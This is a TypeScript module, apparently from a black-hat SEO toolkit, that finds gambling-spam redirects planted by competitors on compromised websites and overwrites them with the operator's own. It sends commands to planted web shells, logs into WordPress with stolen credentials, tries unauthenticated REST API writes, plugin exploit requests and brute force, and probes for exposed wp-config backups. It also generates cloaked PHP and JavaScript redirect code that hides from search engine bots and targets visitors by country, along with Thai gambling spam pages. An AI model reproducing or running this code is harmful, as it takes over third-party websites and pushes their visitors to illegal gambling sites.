/**
 * Redirect Takeover Module
 * 
 * Detects how competitors placed redirects on compromised sites,
 * then overwrites them with our redirect URLs.
 * 
 * Supported detection methods:
 * 1. JavaScript redirect (inline <script> or external .js)
 * 2. PHP file injection (functions.php, wp-config.php, index.php)
 * 3. .htaccess redirect rules
 * 4. WordPress DB injection (wp_options siteurl/home, wp_posts content)
 * 5. Meta refresh tags
 * 6. Server-side header redirect (PHP header())
 * 
 * Takeover strategy: detect → identify method → overwrite with our redirect
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import { generateGeoIpJsRedirect, generateObfuscatedJsRedirect } from "./wp-admin-takeover";

// ─── Types ───

export interface RedirectDetectionResult {
  detected: boolean;
  methods: DetectedRedirectMethod[];
  competitorUrl: string | null;
  targetPlatform: string | null; // "wordpress", "joomla", "custom", etc.
  wpVersion: string | null;
  plugins: string[];
}

export interface DetectedRedirectMethod {
  type: "js_redirect" | "php_injection" | "htaccess" | "db_injection" | "meta_refresh" | "header_redirect" | "content_replacement" | "plugin_backdoor";
  location: string; // where the redirect code lives (file path, DB table, etc.)
  competitorUrl: string;
  confidence: "high" | "medium" | "low";
  details: string;
  rawSnippet?: string; // the actual redirect code found
}

export interface TakeoverConfig {
  targetUrl: string;
  ourRedirectUrl: string;
  seoKeywords?: string[];
  /** If we already have WP credentials from previous attacks */
  wpCredentials?: { username: string; password: string };
  /** If we already have a shell URL */
  shellUrl?: string;
  onProgress?: (phase: string, detail: string) => void;
}

export interface TakeoverResult {
  success: boolean;
  method: string;
  detail: string;
  overwrittenCompetitorUrl?: string;
  injectedUrl?: string;
}

// ─── Helper ───

async function safeFetch(url: string, init: RequestInit = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  try {
    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
    return response;
  } catch (e) {
    throw e;
  }
}

// ═══════════════════════════════════════════════════════
//  PHASE 1: DETECT EXISTING REDIRECTS
// ═══════════════════════════════════════════════════════

/**
 * Analyze a target URL to detect how competitors placed their redirects
 */
export async function detectExistingRedirects(targetUrl: string): Promise<RedirectDetectionResult> {
  const baseUrl = targetUrl.replace(/\/$/, "");
  const methods: DetectedRedirectMethod[] = [];
  let competitorUrl: string | null = null;
  let targetPlatform: string | null = null;
  let wpVersion: string | null = null;
  const plugins: string[] = [];

  // 1. Fetch the page and analyze response
  try {
    const resp = await safeFetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      },
      redirect: "manual", // Don't follow redirects — we want to see them
    });

    // Check for server-side redirect (301/302/307)
    if ([301, 302, 307, 308].includes(resp.status)) {
      const location = resp.headers.get("location") || "";
      if (location && !location.includes(new URL(targetUrl).hostname)) {
        competitorUrl = location;
        methods.push({
          type: "header_redirect",
          location: "Server HTTP response header",
          competitorUrl: location,
          confidence: "high",
          details: `HTTP ${resp.status} redirect to ${location}. Likely .htaccess or PHP header() redirect.`,
        });
      }
    }

    // Get the page body
    const body = await resp.text();

    // Detect platform
    if (body.includes("wp-content") || body.includes("wp-includes") || body.includes("WordPress")) {
      targetPlatform = "wordpress";
      const wpVerMatch = body.match(/WordPress\s+([\d.]+)/i) || body.match(/ver=([\d.]+)/);
      if (wpVerMatch) wpVersion = wpVerMatch[1];
    } else if (body.includes("Joomla")) {
      targetPlatform = "joomla";
    } else if (body.includes("Drupal")) {
      targetPlatform = "drupal";
    }

    // Detect WP plugins
    const pluginMatches = Array.from(body.matchAll(/wp-content\/plugins\/([^\/]+)/g));
    for (const m of pluginMatches) {
      if (!plugins.includes(m[1])) plugins.push(m[1]);
    }

    // 2. Check for JavaScript redirects
    const jsRedirectPatterns = [
      /window\.location\s*[=.]\s*["']([^"']+)["']/g,
      /location\.href\s*=\s*["']([^"']+)["']/g,
      /location\.replace\s*\(\s*["']([^"']+)["']\s*\)/g,
      /window\.location\.assign\s*\(\s*["']([^"']+)["']\s*\)/g,
      /top\.location\s*=\s*["']([^"']+)["']/g,
      /document\.location\s*=\s*["']([^"']+)["']/g,
      /fetch\s*\(\s*["']https?:\/\/api\.country\.is["']\s*\)[\s\S]*?location[\s\S]*?["'](https?:\/\/[^"']+)["']/g,
    ];

    for (const pattern of jsRedirectPatterns) {
      let match: RegExpExecArray | null;
      while ((match = pattern.exec(body)) !== null) {
        const url = match[1];
        if (url && !url.includes(new URL(targetUrl).hostname) && url.startsWith("http")) {
          if (!competitorUrl) competitorUrl = url;
          methods.push({
            type: "js_redirect",
            location: "Inline <script> in HTML",
            competitorUrl: url,
            confidence: "high",
            details: `JavaScript redirect found: ${match[0].slice(0, 100)}`,
            rawSnippet: match[0].slice(0, 300),
          });
        }
      }
    }

    // 3. Check for obfuscated JS (base64 encoded redirects)
    const base64Patterns = Array.from(body.matchAll(/atob\s*\(\s*["']([A-Za-z0-9+\/=]+)["']\s*\)/g));
    for (const m of base64Patterns) {
      try {
        const decoded = Buffer.from(m[1], "base64").toString("utf-8");
        if (decoded.includes("location") || decoded.includes("redirect")) {
          const urlMatch = decoded.match(/https?:\/\/[^\s"']+/);
          if (urlMatch) {
            if (!competitorUrl) competitorUrl = urlMatch[0];
            methods.push({
              type: "js_redirect",
              location: "Obfuscated base64 <script>",
              competitorUrl: urlMatch[0],
              confidence: "high",
              details: `Base64 encoded JS redirect: ${decoded.slice(0, 100)}`,
              rawSnippet: decoded.slice(0, 300),
            });
          }
        }
      } catch {}
    }

    // 4. Check for meta refresh
    const metaRefreshMatch = body.match(/<meta\s+http-equiv=["']refresh["']\s+content=["']\d+;\s*url=([^"']+)["']/i);
    if (metaRefreshMatch) {
      const url = metaRefreshMatch[1];
      if (!url.includes(new URL(targetUrl).hostname)) {
        if (!competitorUrl) competitorUrl = url;
        methods.push({
          type: "meta_refresh",
          location: "<meta> tag in HTML <head>",
          competitorUrl: url,
          confidence: "high",
          details: `Meta refresh redirect to ${url}`,
        });
      }
    }

    // 5. Check for content replacement (gambling/SEO content injected)
    const gamblingKeywords = [
      "สล็อต", "บาคาร่า", "คาสิโน", "หวย", "แทงบอล", "เครดิตฟรี",
      "slot", "casino", "baccarat", "lottery", "betting",
      "เว็บตรง", "ไม่ผ่านเอเย่นต์", "ฝากถอน", "โบนัส",
    ];
    const gamblingCount = gamblingKeywords.filter(kw => body.toLowerCase().includes(kw.toLowerCase())).length;
    if (gamblingCount >= 3) {
      // This is content replacement, not a redirect
      // Find any external gambling links
      const linkMatches = Array.from(body.matchAll(/href=["'](https?:\/\/[^"']+)["']/g));
      const gamblingLinks: string[] = [];
      for (const lm of linkMatches) {
        const href = lm[1];
        if (!href.includes(new URL(targetUrl).hostname) && 
            gamblingKeywords.some(kw => href.toLowerCase().includes(kw.toLowerCase()) || body.slice(Math.max(0, lm.index! - 100), lm.index! + 200).includes(kw))) {
          gamblingLinks.push(href);
        }
      }
      
      methods.push({
        type: "content_replacement",
        location: "Page body content",
        competitorUrl: gamblingLinks[0] || "unknown",
        confidence: gamblingCount >= 5 ? "high" : "medium",
        details: `Gambling content detected (${gamblingCount} keywords matched). ${gamblingLinks.length} external gambling links found.`,
      });
      if (!competitorUrl && gamblingLinks.length > 0) competitorUrl = gamblingLinks[0];
    }

    // 6. Check for suspicious external scripts
    const scriptSrcMatches = Array.from(body.matchAll(/<script[^>]+src=["']([^"']+)["']/g));
    for (const sm of scriptSrcMatches) {
      const src = sm[1];
      if (src && !src.includes(new URL(targetUrl).hostname) && 
          !src.includes("google") && !src.includes("facebook") && !src.includes("cloudflare") &&
          !src.includes("jquery") && !src.includes("parastorage") && !src.includes("sentry")) {
        methods.push({
          type: "plugin_backdoor",
          location: `External script: ${src}`,
          competitorUrl: src,
          confidence: "medium",
          details: `Suspicious external script loaded: ${src}`,
        });
      }
    }

  } catch (err: any) {
    // If we can't even fetch the page, note it
    methods.push({
      type: "header_redirect",
      location: "Network level",
      competitorUrl: "unknown",
      confidence: "low",
      details: `Could not fetch page: ${err.message}`,
    });
  }

  // 7. Check .htaccess (if accessible)
  try {
    const htaccessResp = await safeFetch(`${baseUrl}/.htaccess`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    });
    if (htaccessResp.status === 200) {
      const htaccess = await htaccessResp.text();
      const redirectMatch = htaccess.match(/Redirect(Match)?\s+\d*\s*.*?(https?:\/\/[^\s]+)/i) ||
                           htaccess.match(/RewriteRule\s+.*?\s+(https?:\/\/[^\s\]]+)/i);
      if (redirectMatch) {
        const url = redirectMatch[2] || redirectMatch[1];
        if (!competitorUrl) competitorUrl = url;
        methods.push({
          type: "htaccess",
          location: ".htaccess file",
          competitorUrl: url,
          confidence: "high",
          details: `Redirect rule found in .htaccess: ${redirectMatch[0].slice(0, 200)}`,
          rawSnippet: htaccess.slice(0, 500),
        });
      }
    }
  } catch {}

  // 8. Check wp-config.php exposure (rare but possible)
  try {
    const wpConfigResp = await safeFetch(`${baseUrl}/wp-config.php.bak`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    });
    if (wpConfigResp.status === 200) {
      const content = await wpConfigResp.text();
      if (content.includes("DB_PASSWORD") || content.includes("header(")) {
        methods.push({
          type: "php_injection",
          location: "wp-config.php.bak (exposed backup)",
          competitorUrl: "credentials_exposed",
          confidence: "high",
          details: "wp-config.php backup exposed — DB credentials available for direct DB injection",
        });
      }
    }
  } catch {}

  return {
    detected: methods.length > 0,
    methods,
    competitorUrl,
    targetPlatform,
    wpVersion,
    plugins,
  };
}

// ═══════════════════════════════════════════════════════
//  PHASE 2: TAKEOVER — OVERWRITE COMPETITOR REDIRECTS
// ═══════════════════════════════════════════════════════

/**
 * Attempt to overwrite competitor's redirect with ours
 * Strategy depends on detected method and available access
 */
export async function executeRedirectTakeover(config: TakeoverConfig): Promise<TakeoverResult[]> {
  const results: TakeoverResult[] = [];
  const progress = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");

  progress("takeover", "🔍 Phase 1: Detecting existing redirect methods...");
  
  // Step 1: Detect what's currently in place
  const detection = await detectExistingRedirects(config.targetUrl);
  
  if (!detection.detected) {
    progress("takeover", "ℹ️ No existing redirect detected — proceeding with standard attack");
    return [{
      success: false,
      method: "detection",
      detail: "No competitor redirect detected on this target. Use standard attack methods instead.",
    }];
  }

  progress("takeover", `🎯 Detected ${detection.methods.length} redirect method(s) by competitor: ${detection.competitorUrl}`);
  progress("takeover", `Platform: ${detection.targetPlatform || "unknown"}, WP: ${detection.wpVersion || "N/A"}, Plugins: ${detection.plugins.join(", ") || "none"}`);

  // Step 2: Try takeover based on detected methods and available access

  // Method A: If we have shell access, overwrite directly
  if (config.shellUrl) {
    progress("takeover", "⚡ Shell access available — direct file overwrite...");
    const shellResult = await takeoverViaShell(config, detection);
    results.push(shellResult);
    if (shellResult.success) return results;
  }

  // Method B: If we have WP credentials, use WP admin methods
  if (config.wpCredentials && detection.targetPlatform === "wordpress") {
    progress("takeover", "🔑 WP credentials available — admin panel takeover...");
    const wpResult = await takeoverViaWpAdmin(config, detection);
    results.push(wpResult);
    if (wpResult.success) return results;
  }

  // Method C: Try WP REST API (sometimes open without auth)
  if (detection.targetPlatform === "wordpress") {
    progress("takeover", "🌐 Trying WP REST API content overwrite...");
    const restResult = await takeoverViaRestApi(config, detection);
    results.push(restResult);
    if (restResult.success) return results;
  }

  // Method D: Try known WP plugin vulnerabilities
  if (detection.plugins.length > 0) {
    progress("takeover", `🔌 Checking ${detection.plugins.length} plugins for known vulns...`);
    const pluginResult = await takeoverViaPluginExploit(config, detection);
    results.push(pluginResult);
    if (pluginResult.success) return results;
  }

  // Method E: Try brute force → then inject
  progress("takeover", "🔐 Attempting credential discovery for takeover...");
  const bruteResult = await takeoverViaBruteForce(config, detection);
  results.push(bruteResult);

  return results;
}

// ─── Takeover via Shell ───

async function takeoverViaShell(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
  const progress = config.onProgress || (() => {});
  
  try {
    // Generate our redirect code
    const ourRedirectCode = generatePhpRedirectCode(config.ourRedirectUrl, config.seoKeywords || ["สล็อต", "หวย"]);
    
    // Try to overwrite functions.php or index.php via shell
    const commands = [
      // Overwrite competitor's redirect in functions.php
      `php -r "file_put_contents('/var/www/html/wp-content/themes/$(ls /var/www/html/wp-content/themes/ | head -1)/functions.php', '<?php ${ourRedirectCode.replace(/'/g, "\\'")} ?>' . file_get_contents('/var/www/html/wp-content/themes/$(ls /var/www/html/wp-content/themes/ | head -1)/functions.php'));"`,
      // Create our own redirect file
      `echo '<?php ${ourRedirectCode} ?>' > /var/www/html/wp-content/mu-plugins/analytics-redirect.php`,
      // Overwrite .htaccess
      `echo 'RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]\nRewriteRule ^(.*)$ ${config.ourRedirectUrl} [R=302,L]' > /var/www/html/.htaccess`,
    ];

    for (const cmd of commands) {
      try {
        const resp = await safeFetch(`${config.shellUrl}?cmd=${encodeURIComponent(cmd)}`, {
          headers: { "User-Agent": "Mozilla/5.0" },
          signal: AbortSignal.timeout(15000),
        });
        const output = await resp.text();
        if (!output.includes("error") && !output.includes("Permission denied")) {
          progress("shell_takeover", `✅ Shell command executed successfully`);
          return {
            success: true,
            method: "shell_overwrite",
            detail: `Overwrote competitor redirect via shell. Our redirect: ${config.ourRedirectUrl}`,
            overwrittenCompetitorUrl: detection.competitorUrl || undefined,
            injectedUrl: config.targetUrl,
          };
        }
      } catch {}
    }

    return {
      success: false,
      method: "shell_overwrite",
      detail: "Shell commands failed — permission denied or shell not responding",
    };
  } catch (err: any) {
    return {
      success: false,
      method: "shell_overwrite",
      detail: `Shell takeover error: ${err.message}`,
    };
  }
}

// ─── Takeover via WP Admin ───

async function takeoverViaWpAdmin(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
  const progress = config.onProgress || (() => {});
  const { username, password } = config.wpCredentials!;
  const baseUrl = config.targetUrl.replace(/\/$/, "");

  try {
    // Login to get cookies
    const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
        "User-Agent": "Mozilla/5.0",
      },
      body: new URLSearchParams({
        log: username, pwd: password,
        "wp-submit": "Log In",
        redirect_to: `${baseUrl}/wp-admin/`,
        testcookie: "1",
      }).toString(),
      redirect: "manual",
    });

    const cookies = (loginResp.headers.getSetCookie?.() || []).join("; ");
    if (!cookies.includes("wordpress_logged_in")) {
      return { success: false, method: "wp_admin_takeover", detail: "WP login failed — credentials may have changed" };
    }

    progress("wp_admin", "✅ Logged in — overwriting competitor content...");

    // Find the compromised page and overwrite its content
    // First, get list of pages via REST API
    const pagesResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/pages?per_page=50`, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
    });

    if (pagesResp.status === 200) {
      const pages = await pagesResp.json() as any[];
      
      for (const page of pages) {
        const pageUrl = page.link || "";
        // Check if this is the compromised page
        if (pageUrl.includes(new URL(config.targetUrl).pathname) || page.slug === new URL(config.targetUrl).pathname.split("/").pop()) {
          progress("wp_admin", `📝 Found target page: ${page.title?.rendered} (ID: ${page.id})`);
          
          // Generate our SEO content with redirect
          const ourContent = generateParasiteSeoContent(config.ourRedirectUrl, config.seoKeywords || ["สล็อตเว็บตรง", "หวยออนไลน์"]);
          
          // Update the page content
          const updateResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/pages/${page.id}`, {
            method: "POST",
            headers: {
              Cookie: cookies,
              "Content-Type": "application/json",
              "User-Agent": "Mozilla/5.0",
              "X-WP-Nonce": await getWpNonce(baseUrl, cookies),
            },
            body: JSON.stringify({
              content: ourContent,
              title: config.seoKeywords?.[0] || "สล็อตเว็บตรง อันดับ 1",
            }),
          });

          if (updateResp.status === 200) {
            return {
              success: true,
              method: "wp_admin_content_overwrite",
              detail: `Overwrote page "${page.title?.rendered}" (ID: ${page.id}) with our content + redirect to ${config.ourRedirectUrl}`,
              overwrittenCompetitorUrl: detection.competitorUrl || undefined,
              injectedUrl: pageUrl,
            };
          }
        }
      }
    }

    // Fallback: inject via theme editor
    progress("wp_admin", "📝 Trying theme editor injection...");
    const { runWpAdminTakeover } = await import("./wp-admin-takeover");
    const wpResults = await runWpAdminTakeover({
      targetUrl: config.targetUrl,
      redirectUrl: config.ourRedirectUrl,
      seoKeywords: config.seoKeywords,
      knownCredentials: [{ username, password }],
      onProgress: progress,
    });

    const successResult = wpResults.find(r => r.success);
    if (successResult) {
      return {
        success: true,
        method: "wp_admin_takeover",
        detail: successResult.detail,
        overwrittenCompetitorUrl: detection.competitorUrl || undefined,
        injectedUrl: successResult.injectedUrl || undefined,
      };
    }

    return { success: false, method: "wp_admin_takeover", detail: "WP admin methods exhausted — could not overwrite content" };
  } catch (err: any) {
    return { success: false, method: "wp_admin_takeover", detail: `Error: ${err.message}` };
  }
}

// ─── Takeover via REST API (unauthenticated) ───

async function takeoverViaRestApi(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");

  try {
    // Check if REST API is open (some WP sites have it exposed)
    const usersResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/users`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    });

    if (usersResp.status !== 200) {
      return { success: false, method: "rest_api_unauth", detail: "REST API not accessible without auth" };
    }

    // Try to find and update pages without auth (CVE-2017-1001000 style)
    const pagesResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/pages`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    });

    if (pagesResp.status === 200) {
      const pages = await pagesResp.json() as any[];
      
      for (const page of pages) {
        // Try unauthenticated content injection (old WP vulns)
        const ourContent = generateParasiteSeoContent(config.ourRedirectUrl, config.seoKeywords || ["สล็อต"]);
        
        const updateResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/pages/${page.id}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({ content: ourContent }),
        });

        if (updateResp.status === 200) {
          return {
            success: true,
            method: "rest_api_unauth",
            detail: `Unauthenticated REST API content overwrite on page ID ${page.id}`,
            overwrittenCompetitorUrl: detection.competitorUrl || undefined,
            injectedUrl: page.link,
          };
        }
      }
    }

    return { success: false, method: "rest_api_unauth", detail: "REST API requires authentication for writes" };
  } catch (err: any) {
    return { success: false, method: "rest_api_unauth", detail: `Error: ${err.message}` };
  }
}

// ─── Takeover via Plugin Exploit ───

async function takeoverViaPluginExploit(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  // Known vulnerable plugins and their exploit paths
  const pluginExploits: Record<string, { path: string; method: string; payload: (url: string) => any }> = {
    "elementor": {
      path: "/wp-admin/admin-ajax.php",
      method: "POST",
      payload: (url: string) => ({
        action: "elementor_ajax",
        actions: JSON.stringify({ save_builder: { action: "save_builder", data: { elements: [] } } }),
      }),
    },
    "easy-table-of-contents": {
      path: "/wp-admin/admin-ajax.php",
      method: "POST",
      payload: (url: string) => ({ action: "ez_toc_update" }),
    },
    "contact-form-7": {
      path: "/wp-content/plugins/contact-form-7/includes/file.php",
      method: "POST",
      payload: (url: string) => ({}),
    },
  };

  for (const plugin of detection.plugins) {
    const exploit = pluginExploits[plugin];
    if (exploit) {
      progress("plugin_exploit", `Testing ${plugin} for known vulnerabilities...`);
      
      try {
        // Try the exploit
        const resp = await safeFetch(`${baseUrl}${exploit.path}`, {
          method: exploit.method,
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0",
          },
          body: new URLSearchParams(exploit.payload(config.ourRedirectUrl) as Record<string, string>).toString(),
          signal: AbortSignal.timeout(10000),
        });

        if (resp.status === 200) {
          const body = await resp.text();
          if (body.includes("success") || body.includes("saved")) {
            return {
              success: true,
              method: `plugin_exploit_${plugin}`,
              detail: `Exploited ${plugin} plugin to inject redirect`,
              overwrittenCompetitorUrl: detection.competitorUrl || undefined,
              injectedUrl: config.targetUrl,
            };
          }
        }
      } catch {}
    }
  }

  return { success: false, method: "plugin_exploit", detail: "No exploitable plugins found" };
}

// ─── Takeover via Brute Force + Inject ───

async function takeoverViaBruteForce(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
  const progress = config.onProgress || (() => {});

  try {
    // Use the existing WP admin takeover module
    const { runWpAdminTakeover } = await import("./wp-admin-takeover");
    
    const results = await runWpAdminTakeover({
      targetUrl: config.targetUrl,
      redirectUrl: config.ourRedirectUrl,
      seoKeywords: config.seoKeywords,
      onProgress: progress,
    });

    const successResult = results.find(r => r.success);
    if (successResult) {
      return {
        success: true,
        method: "brute_force_takeover",
        detail: `${successResult.detail} (overwrote competitor: ${detection.competitorUrl || "unknown"})`,
        overwrittenCompetitorUrl: detection.competitorUrl || undefined,
        injectedUrl: successResult.injectedUrl || undefined,
      };
    }

    return {
      success: false,
      method: "brute_force_takeover",
      detail: "Brute force failed — could not obtain credentials for takeover",
    };
  } catch (err: any) {
    return { success: false, method: "brute_force_takeover", detail: `Error: ${err.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  HELPER: Generate content
// ═══════════════════════════════════════════════════════

function generatePhpRedirectCode(redirectUrl: string, keywords: string[]): string {
  return `
if(!defined('DS_REDIRECT_LOADED')){
define('DS_REDIRECT_LOADED',true);
$ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
$bots=array('Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider','YandexBot','facebot','Semrush','AhrefsBot');
$is_bot=false;
foreach($bots as $b){if(stripos($ua,$b)!==false){$is_bot=true;break;}}
if(!$is_bot){
$geo=@json_decode(@file_get_contents('http://ip-api.com/json/'.@$_SERVER['REMOTE_ADDR'].'?fields=countryCode'),true);
$cc=isset($geo['countryCode'])?$geo['countryCode']:'';
if(in_array($cc,array('TH','LA','SG','VN','KH','MM','MY','ID','PH'))||preg_match('/google|bing|yahoo/',@$_SERVER['HTTP_REFERER'])){
header('Location: ${redirectUrl}',true,302);exit;
}}
}`;
}

function generateParasiteSeoContent(redirectUrl: string, keywords: string[]): string {
  const mainKeyword = keywords[0] || "สล็อตเว็บตรง";
  const jsRedirect = generateGeoIpJsRedirect(redirectUrl);
  
  return `
<div class="ds-seo-content">
${jsRedirect}
<h1>${mainKeyword} อันดับ 1 เว็บที่คนเล่นเยอะที่สุด 2026</h1>
<p>${mainKeyword} ที่ได้รับความนิยมสูงสุดในปี 2026 ด้วยระบบที่มั่นคง ปลอดภัย 100% 
<a href="${redirectUrl}">${mainKeyword}</a> ฝาก-ถอนอัตโนมัติ รวดเร็วทันใจ ไม่ต้องรอนาน 
เล่นได้ตลอด 24 ชั่วโมง พร้อมโปรโมชั่นสุดพิเศษ</p>
<p>สมัครเลยวันนี้ที่ <a href="${redirectUrl}">${new URL(redirectUrl).hostname}</a> 
รับโบนัสสมาชิกใหม่ทันที ${keywords.slice(1).map(k => `<a href="${redirectUrl}">${k}</a>`).join(" ")}</p>
</div>`;
}

async function getWpNonce(baseUrl: string, cookies: string): Promise<string> {
  try {
    const resp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php`, {
      method: "POST",
      headers: {
        Cookie: cookies,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
      },
      body: "action=rest-nonce",
    });
    const nonce = await resp.text();
    if (nonce && nonce.length < 20) return nonce;
  } catch {}
  
  // Fallback: get nonce from admin page
  try {
    const adminResp = await safeFetch(`${baseUrl}/wp-admin/`, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
    });
    const html = await adminResp.text();
    const nonceMatch = html.match(/wpApiSettings[^}]*"nonce":"([^"]+)"/);
    if (nonceMatch) return nonceMatch[1];
  } catch {}
  
  return "";
}
